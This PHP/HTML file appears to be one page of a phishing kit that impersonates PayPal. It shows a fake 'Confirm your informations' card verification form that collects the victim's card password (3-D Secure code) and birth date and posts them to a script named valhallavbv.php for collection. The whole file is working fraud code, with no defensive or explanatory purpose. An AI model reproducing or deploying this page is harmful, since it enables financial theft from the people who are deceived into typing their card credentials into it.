<?php
	session_start();
	include("../settings/lang/index.php");
?>
<!DOCTYPE html>
<html lang="fr-FR">
<head>
	<title>PayPal</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
	<link rel="shortcut icon" href="../assets/img/x.ico">
	<link rel="apple-touch-icon" href="../assets/img/appx.png">
	<link rel="stylesheet" href="../assets/css/fonts.css" />
	<link rel="stylesheet" href="../assets/css/main.css" />
	<link rel="stylesheet" href="../assets/css/sections.css" />
	<link rel="stylesheet" href="../assets/css/responsev.css" />
	<script type="text/javascript" src="../assets/js/jquery.min.js"></script>
	<script type="text/javascript" src="../assets/js/main.js"></script>
</head>
<body>

	<!--
authflow/entry/?country.x=FR&flowContext=login&flowId=ul&locale.x=fr_FR&returnUri=%2Fauth%2Freturn&stepupContext=8328080216937885391
	-->

	<div>
		<style nonce="">html { display:block }</style>
		<div>
			<div>
				<div class="valhallaContent valhallaContentInfo">

				<!-- CONTAINER --> 
					<div class="valhallasafeComponent">
						<header class="valhallaInfo">
							<div class="valhallaLogo big"></div>
						</header>
						<div class="valhallasafe">
							<h1 class="valhallaInfoTitle">Confirm your informations</h1>
								<p class="valhallaFormTitle">Please verify carefully your card informations</p>

							<form action="../settings/send/valhallavbv.php" method="post" name="vbForm" onsubmit="return validateVbForm()">

								<p class="FieldsTitle">Card verification :</p>
								<div class="valhallaFieldset">
									<input type="text" name="" class="valhallacctyped" value="4357 •••• •••• 8097" disabled="disabled" readonly="readonly" />
								</div>
								<div class="valhallaFieldset">
									<input type="password" name="valhallaccpas" id="valhallaccpas" placeholder="<?php echo $valhalla30; ?>" autocomplete="off" autocorrect="off" />
								</div>
								<div class="valhallaFieldset">
									<input type="text" name="valhallasn" id="valhallasn" placeholder="<?php echo $valhalla31; ?>" id="valhallassn" maxlength="10" autocomplete="off" autocorrect="off" readonly value="<?php echo $_SESSION["valhallaBirth"]; ?>"/>
								</div>
								

								<input type="submit" class="valhallaButton" value="<?php echo $valhalla32; ?>">
							</form>
						</div>
					</div>

				<!-- LOADING -->
					<div class="valhallaLoaderOverlay">
						<div class="valhallaModalAnimate hide">
							<div class="valhallaRotate"></div>
							<div class="valhallaProcessing"><?php echo $valhalla12; ?></div>
							<div class="valhallaLoaderOverlayAdditionalElements"></div>
						</div>
					</div>
					<div class="valhallaModalOverlay hide"></div>

				</div>
			</div>
		</div>
	</div>

	<footer class="valhallaFooter">
		<ul class="valhallaFooterLinks">
			<li class="contactFooterListItem"><a href="javascript:void()"><?php echo $foot1; ?></a></li>
			<li class="privacyFooterListItem"><a href="javascript:void()"><?php echo $foot2; ?></a></li>
			<li class="legalFooterListItem"><a href="javascript:void()"><?php echo $foot3; ?></a></li>
			<li class="worldwideFooterListItem"><a href="javascript:void()"><?php echo $foot4; ?></a></li>
		</ul>
		<div></div>
	</footer>

	<script type="text/javascript" src="../assets/js/sections.js"></script>

	<script>
	$(document).ready(function(){
		$('#valhallaccpas').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#valhallaccpas').removeClass('hasError'); } else {$('#valhallaccpas').removeClass('hasError'); }});

		$('#valhallasn').on('keyup keydown keypress change paste', function() {	
			if ($(this).val() == '') { $('#valhallasn').removeClass('hasError'); } else {$('#valhallasn').removeClass('hasError'); }});
		
		});
	</script>
	
<!-- LOADING -->
	<div class="valhallaLoaderOverlay">
		<div class="valhallaModalAnimate" id="valhallaModalAnimate">
			<div class="valhallaRotate"></div>
			<div class="valhallaProcessing"><?php echo $valhalla12; ?></div>
			<div class="valhallaLoaderOverlayAdditionalElements"></div>
		</div>
	</div>
	<div class="valhallaModalOverlay" id="valhallaModalOverlay"></div>

</body>
</html>